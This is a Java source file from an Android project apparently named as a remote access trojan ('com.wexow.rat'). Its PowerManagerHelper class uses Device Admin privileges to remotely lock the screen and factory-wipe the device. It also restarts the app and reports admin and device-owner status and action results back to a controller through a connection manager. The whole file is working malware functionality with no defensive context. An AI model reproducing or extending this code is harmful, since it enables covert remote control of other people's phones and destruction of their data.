package com.wexow.rat.managers;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.wexow.rat.admin.AdminReceiver;
import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

public class PowerManagerHelper {
    private static final String TAG = "PowerManagerHelper";

    // ===== lock Screen (Device Admin) =====
    public static void lockScreen(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, AdminReceiver.class);

            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.lockNow();
                sendResult("lock", true, null);
            } else {
                sendResult("lock", false, "Device Admin not active");
            }
        } catch (Exception e) {
            sendResult("lock", false, e.getMessage());
        }
    }

    // =====  wipe Device (Device Admin)  =====
    public static void wipeDevice(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, AdminReceiver.class);

            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.wipeData(0);
                sendResult("wipe", true, null);
            } else {
                sendResult("wipe", false, "Device Admin not active");
            }
        } catch (Exception e) {
            sendResult("wipe", false, e.getMessage());
        }
    }

    // ===== restart App =====
    public static void restartApp(Context ctx) {
        try {
            android.app.AlarmManager am =
                (android.app.AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            Intent i = new Intent(ctx, Class.forName("com.wexow.rat.MainActivity"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(ctx, 0, i,
                android.app.PendingIntent.FLAG_IMMUTABLE);

            if (am != null) {
                am.set(android.app.AlarmManager.RTC,
                    System.currentTimeMillis() + 1000, pi);
            }
            System.exit(0);
        } catch (Exception e) {
            Log.e(TAG, "restartApp: " + e.getMessage());
        }
    }

    // ===== check Status =====
    public static void checkStatus(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, AdminReceiver.class);

            boolean isAdmin = dpm != null && dpm.isAdminActive(admin);
            boolean isOwner = dpm != null && dpm.isDeviceOwnerApp(ctx.getPackageName());

            JSONObject jo = new JSONObject();
            jo.put("type", "power_status");
            jo.put("is_admin", isAdmin);
            jo.put("is_device_owner", isOwner);
            jo.put("can_lock", isAdmin);
            jo.put("can_wipe", isAdmin);
            jo.put("sdk", Build.VERSION.SDK_INT);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }

    private static void sendResult(String action, boolean success, String error) {
        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "power_action_result");
            jo.put("action", action);
            jo.put("success", success);
            if (error != null) jo.put("error", error);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }
}